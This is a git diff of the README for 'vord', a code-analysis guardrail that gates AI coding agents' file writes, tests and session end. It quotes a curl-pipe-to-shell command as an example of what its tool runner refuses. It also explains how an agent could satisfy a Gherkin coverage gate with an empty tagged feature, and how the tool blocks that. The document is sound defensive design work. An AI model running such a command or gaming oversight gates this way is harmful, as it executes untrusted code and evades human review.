@@ -69,6 +69,46 @@ policy is versioned and reviewed in the same pull request as the code it
 governs, on every teammate's machine and in CI. A plugin lives in one user's
 configuration, where turning it off leaves no trace in a diff.
 
+### As a [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) plugin
+
+DeepSeek Harness's official `dsh-hooks-claude-code` bridge runs the exact
+`PreToolUse`/`PostToolUse` payload shape `vord hook claude-code` already
+speaks — no new vord code needed, just wiring. See
+[`integrations/deepseek-harness/`](integrations/deepseek-harness/) for the
+verified compatibility notes, the one tool-naming gotcha, and a ready-to-mount
+`cordis.yml` entry.
+
+### As an [Agent Plugins](https://github.com/agentplugins/agent-plugins-spec) package
+
+Both this repository root and `integrations/claude-code-plugin/` are also
+plugins under the [Agent Plugins Specification](https://agent-plugins.org)
+v1.0.0: a root `plugin.json` manifest, a `skills/` directory (the guardrail
+and general static-analysis capabilities as `SKILL.md` files), and an
+`mcp.json` exposing `vord mcp` — vord's own stdio MCP server — as the
+`vord` server. Any spec-conformant client can discover and load these
+without Claude Code-specific knowledge. Claude Code's own loading
+mechanism (`.claude-plugin/plugin.json`, `hooks/hooks.json`) is unchanged
+and lives alongside these files; it's referenced for spec-aware tooling
+under `extensions.com.anthropic.claude-code` in `plugin.json`, since
+Claude Code requires those files at their current, fixed locations.
+
+`skills/old-coder/` is a third skill in that directory, vendored (MIT) from
+[AmazingAng/old-coder](https://github.com/AmazingAng/old-coder): an
+evidence-first development loop (SPEC → RED → GREEN → REFACTOR → GAUNTLET →
+EVIDENCE) for tasks where the human wants to approve a test plan and read
+an evidence report instead of the code itself. Its GAUNTLET step composes
+with vord's own gate — see "Using this with vord" at the end of that
+skill's `SKILL.md`.
+
+`skills/agent-dev-loop/` is a fourth: the end-to-end loop for a repository
+that pairs vord's write-time guardrail with [okf-mcp](https://github.com/pmaojo/okf-mcp)
+as durable cross-session memory — recover context via `memory_search` before
+planning, agree a spec with `spec_propose` before code, decompose into a
+`spec_tasks` dependency graph, work RED→GREEN under the guardrail, and close
+each task only once `memory_patch` accepts an `## Evidencia` section backed
+by real command output. Use it at the start of any session in such a
+repository, before reading code or planning work.
+
 ## Topology
 
 The directory structure *is* the architecture — nested workspace globs define the boundaries:
@@ -90,6 +130,7 @@ vord/
 │   ├── crap/                   # vord-crap: risk = complexity² × untestedness³ + complexity
 │   ├── flow-graph/             # vord-flow-graph: same-file function call graph over the neutral AST
 │   ├── flow-risk/              # vord-flow-risk: untested-sequence detection + [[flows]] evaluation
+│   ├── cfg/                    # vord-cfg: control-flow/SSA/control-dependence graphs (feeds taint + CK/Halstead metrics)
 │   └── duplication/            # vord-cpd: copy-paste detection (rolling-window hashes)
 ├── infra/                      # OUTBOUND ADAPTERS
 │   ├── memory/                 # in-memory storage/metrics (CLI, tests)
@@ -104,13 +145,17 @@ vord/
 │   ├── treesitter-python/
 │   ├── treesitter-go/
 │   └── ...                     # 20 more: c, cpp, csharp, java, kotlin, ruby, php, swift, scala, ...
-├── rulesets/                   # PLUGINS implementing the Rule trait — 161 rules, 16 crates
+├── rulesets/                   # PLUGINS implementing the Rule trait — 328 rules, 18 crates
 │   ├── owasp/                  # secrets, eval/exec, command-exec hotspots, taint injection (incl. cross-file)
 │   ├── code-smells/            # SOLID (see below), complexity (cyclomatic + cognitive), TODO/FIXME, long functions
 │   ├── architecture/           # hexagonal layering, framework purity, import cycles, Martin component metrics
 │   ├── ddd/                    # tactical DDD: anemic model, entity setters, primitive obsession, aggregate leaks
 │   ├── rust/                   # Rust-only: undocumented unsafe, mem::transmute/forget, process::exit/abort
 │   ├── wordpress/              # WPCS-shaped: escaping, sanitization, nonces, prepared $wpdb, i18n, deprecated APIs
+│   ├── mutation/                # AST-only mutation-gap detection: conditional-boundary, boolean-inversion,
+│   │                             # arithmetic-operator, return-value-substitution, void-call-deletion
+│   ├── vite-react/              # Vite/React starter conventions: data-layer isolation, transport-client
+│   │                             # placement, hardcoded base URLs
 │   └── ...                     # 10 more: python, go, typescript, react, reactive, iac, a11y, ai-agent, php, secrets
 └── bin/                        # COMPOSITION ROOTS (testing dead-zones)
     ├── cli/                    # vord scan/hook/agent/swarm/triage/fix — local end-to-end analysis
@@ -189,7 +234,7 @@ Every command below works against an installed binary too — replace
 cargo run -p vord-cli                  # no args, in a terminal: interactive wizard
                                         # (scope: whole repo / branch diff / path — then
                                         # agent prompt, guided remediation, or CI install)
-cargo test --workspace                 # unit (fakes), fixtures, e2e — ~1700 tests
+cargo test --workspace                 # unit (fakes), fixtures, e2e — ~2600 tests
 cargo run -p vord-cli -- scan fixtures # real scan: a small multi-language fixture set, rules + taint + CPD + complexity
 cargo run -p vord-cli -- scan fixtures --format json
 cargo run -p vord-cli -- scan fixtures --fail-on critical      # exit 2 on severity breach
@@ -235,6 +280,16 @@ for anything in this repo.
 Every other entry point above answers *"what is wrong with this code?"* after
 the fact. `vord hook` answers *"may this write happen?"* — inside an
 autonomous agent's edit loop, before the bytes reach disk.
+
+**What this does not replace.** Every finding here comes from parsing
+syntax — cyclomatic complexity, coupling, layering, naming, duplicated
+logic. `vord` has no type checker and no borrow checker, so a write that
+passes every rule below can still fail `cargo build`/`tsc`/`mypy`: a borrow
+conflict, a missing `mod` declaration, a struct literal missing a field the
+tests expect — none of that is visible from the tree alone. This guardrail
+complements the compiler and test suite, it does not stand in for either;
+an agent loop should still run its own language's build and test commands
+before treating a write as done.
 
 ```sh
 cargo run -p vord-cli -- hook install        # write vord-policy.toml + .claude/settings.json
@@ -305,10 +360,9 @@ not "who gets credit".
 procedures" gauntlet: `[[gherkin_required]]` names glob patterns an agent may
 only write to if at least one Gherkin scenario somewhere in the repository's
 `.feature` files is tagged `@covers(<glob matching this path>)` — feature-
-level or scenario-level, either counts. `vord hook` scans `.feature` files for
-that tag (no Gherkin execution, no cucumber-rust dependency — just the tag
-lines, which are mechanically easy to find without a full parser) and denies
-a matching write with no AST finding needed, the same "deny on path alone"
+level or scenario-level, either counts. `vord hook` reads `.feature` files
+directly (no Gherkin execution, no cucumber-rust dependency) and denies a
+matching write with no AST finding needed, the same "deny on path alone"
 shape `protected_path` already uses. Off by default and commented out in the
 installed template, unlike `protected_path`: turning it on immediately denies
 every matching write until real `.feature` coverage exists, so it is opt-in
@@ -316,6 +370,63 @@ per repository once that coverage is ready, not a default anyone gets for
 free. The scan itself is skipped entirely (no filesystem walk at all) when no
 `[[gherkin_required]]` glob is configured, keeping the common case as fast as
 before this landed.
+
+The tag by itself is *not* the evidence, because this is the one control an
+agent can lift by writing a file, and a tag costs one line while the scenario
+it claims costs real work. `@covers(core/domain/**)` over a `Feature:` with no
+scenario under it would otherwise wave through every future write to that
+subtree forever. So a claim is credited only when the block carrying it
+describes behaviour concretely: at least one `When` and one `Then` step (a
+`Scenario Outline` also needs an `Examples:` row), and a glob narrower than
+`**`. `Given` is deliberately not required — a `Background:` commonly supplies
+the setup, and honest `When`/`Then` scenarios are everywhere — and steps
+inside a doc string are data, not steps. Keywords are matched in English only:
+a translated `.feature` file gets no credit rather than wrong credit, which
+fails toward denial. Writing an uncredited claim is itself reportable, so the
+agent learns why rather than inferring it from a denial elsewhere:
+`bdd:unverified-scenario` for a tag with no scenario behind it,
+`bdd:overbroad-covers` for a `**`-shaped claim. Both report nothing by
+default — opt in via `advisory_rules`/`blocking_rules` — but the *gate* refuses
+those claims regardless of what either list says.
+
+**Execution enforcement: `[[test_required]]`.** Writing a passing Gherkin
+scenario proves an agent *described* the behaviour it changed; it proves
+nothing about whether the change actually works — an agent can satisfy
+`[[gherkin_required]]` in full and never run the suite the scenario
+describes. `[[test_required]]` closes that gap at the one point in a session
+where it can be closed without per-write false positives: session end. A
+single write cannot attest that a test suite passed — only a completed run
+can — so this is not a `PreToolUse`/`PostToolUse` check like every other
+guard in this document. Instead, `vord hook` maintains a small ledger
+(`.vord-execution-ledger.json`, gitignored): every write to a
+`[[test_required]]`-matching path adds that path to it, and every `Bash`
+command matching `[agent]`'s `test_command_patterns` (`cargo test`, `pytest`,
+`npm test`, and a dozen other per-ecosystem defaults — override the list
+entirely for an unusual test command) that does not visibly fail clears it.
+When the agent's session ends (`Stop`), a non-empty ledger blocks — the same
+`{"decision":"block","reason":...}` shape `PostToolUse` already uses — naming
+every still-unproven path and the command that would clear it. Deliberately
+coarse: one passing run clears every pending path, not just the ones its
+command line happens to name, since there is no general way to know which
+files a given test invocation actually exercised — a scoped-but-wrong signal
+would be worse than a coarse-but-honest one. Off by default, same reasoning
+as `[[gherkin_required]]`: turning it on immediately blocks session end until
+a real test run happens.
+
+**Soft gate: `bdd:uncovered-public-api`.** `[[gherkin_required]]` and
+`[[test_required]]` are both opt-in, per-directory hard gates. This is their
+advisory, repo-wide counterpart: a write that adds a brand-new top-level
+public function to a file no `@covers(...)` claim in the repository names is
+reported as an ordinary finding, regardless of whether that file sits under
+a configured glob. Detection is structural, not textual — Rust's `pub`
+keyword and Go's upper-case-name convention are both unambiguous at the
+single-function level, so only those two languages are covered; every other
+language reports nothing rather than guess at what "exported" means for it
+(TypeScript/JavaScript needs an `export` keyword tracked on the surrounding
+statement, Python's leading-underscore convention says nothing about
+`__all__`), which fails toward under-reporting, never a wrong claim. Reports
+nothing by default, like the other gate-gaming/evidence rules — opt in via
+`advisory_rules`/`blocking_rules`.
 
 **Circuit breaker.** An agent that cannot resolve a finding — a false
 positive, or a vulnerability it does not know how to fix — will otherwise
@@ -432,6 +543,9 @@ reason = "CI definitions gate every other control; changes need human review."
 |---|---|---|
 | **Claude Code** | `PreToolUse` on `Edit\|Write` | **Yes** — the write is prevented |
 | **Claude Code** | `PostToolUse` on `Edit\|Write` | No — the write landed; feeds the finding back as context |
+| **Claude Code** | `PostToolUse` on `Bash` | No — never denies; feeds `[[test_required]]`'s execution ledger |
+| **Claude Code** | `Stop` | **Yes** — blocks session end while `[[test_required]]`'s ledger is non-empty |
+| **DeepSeek Harness** | `dsh-hooks-claude-code` bridge, same `PreToolUse`/`PostToolUse` payloads | **Yes** — see [`integrations/deepseek-harness/`](integrations/deepseek-harness/) |
 | **Codex CLI** | `vord hook check` | Its tool hooks fire for shell commands only, not file writes |
 | **pre-commit / CI** | `vord hook check` | Exit 2 fails the commit or the job |
 
@@ -463,6 +577,22 @@ vord agent run --task "fix it" --rule python:subprocess-shell-true --scope scrip
 vord agent watch-pr --pr 42             # wait out the late review/CI window on a PR
 ```
 
+Runs locally against Qwen, Llama, DeepSeek or anything else an
+OpenAI-compatible `/v1/chat/completions` endpoint fronts — Ollama, vLLM,
+LM Studio, LocalAI — with no cloud API key at all:
+
+```sh
+export VORD_LLM_PROVIDER=openai_compatible   # the default; explicit for clarity
+export VORD_LLM_BASE_URL=http://localhost:11434/v1   # Ollama's default; point at vLLM/LM Studio instead
+export VORD_LLM_MODEL=qwen2.5-coder:32b
+vord agent run --task "remove the shell injection in scripts/deploy.py"
+```
+
+`--model` on the command line overrides `VORD_LLM_MODEL` for one run. The
+policy gate and the analyzer verdict apply identically regardless of which
+model is on the other end of the wire — a local model is judged exactly as
+hard as Claude is.
+
 **1. No edit reaches disk without passing the policy.** Not a second
 implementation of the guardrail — the same `hook::judge` a third-party agent's
 write goes through, on the proposed content, in-process, before the `write`
@@ -477,11 +607,20 @@ baseline taken before the run started. If the target rule still fires, or a
 finding appeared that was not there before, the objection becomes the next
 user turn and the session continues. There is no self-assessment turn.
 
-The tool set is closed — `read`, `write`, `edit`, `search`, `run`, `scan` —
-and there is no shell. `run` executes one allow-listed program: no pipes, no
-chaining, no redirection, so `cargo test; curl evil.sh | sh` is refused rather
-than half-checked. Paths are resolved inside the repository root, and a
-command that outlives its timeout is killed.
+The tool set is closed — `read`, `write`, `edit`, `search`, `run`, `scan`,
+`graph` — and there is no shell. `run` executes one allow-listed program: no
+pipes, no chaining, no redirection, so `cargo test; curl evil.sh | sh` is
+refused rather than half-checked. Paths are resolved inside the repository
+root, and a command that outlives its timeout is killed.
+
+`graph` queries the repository's import/dependency graph without the model
+having to `search` its way to an answer by regex: `dependents` (who breaks if
+I change this file), `dependencies` (what this file pulls in), `cycles`
+(import cycles, whole-repository or narrowed to one file), and `components`
+(component-level coupling — the same view `vord arch` renders). It answers
+from the same `core/import-graph` analysis the architecture rules and
+`vord arch` already ship, rebuilt fresh on every call so a file the agent just
+edited is reflected immediately.
 
 Six terminal states, six exit codes, because a supervisor should never have to
 parse prose and "we could not check" must never read as success:
@@ -608,6 +747,8 @@ pull request from a verified fix. Full design and status:
 ## `vord kickoff` — AI-driven project templates
 
 `vord kickoff` scaffolds new project templates that are pre-configured with rules to enforce clean architecture and best practices from day one. Instead of fighting technical debt later, the templates ship with a `vord.toml` configuration that holds AI agents and human developers to strict architectural boundaries.
+
+Every template also writes a `features/*.feature` Gherkin BDD scaffold, with a placeholder scenario and a `TODO(agent)` banner. An AI agent driving the kickoff is expected to replace that placeholder with real `Scenario:` blocks derived from the task's known plan/requirements before writing any implementation code — kickoff never overwrites a feature file that's already been filled in.
 
 ```sh
 vord kickoff --template react-bulletproof .
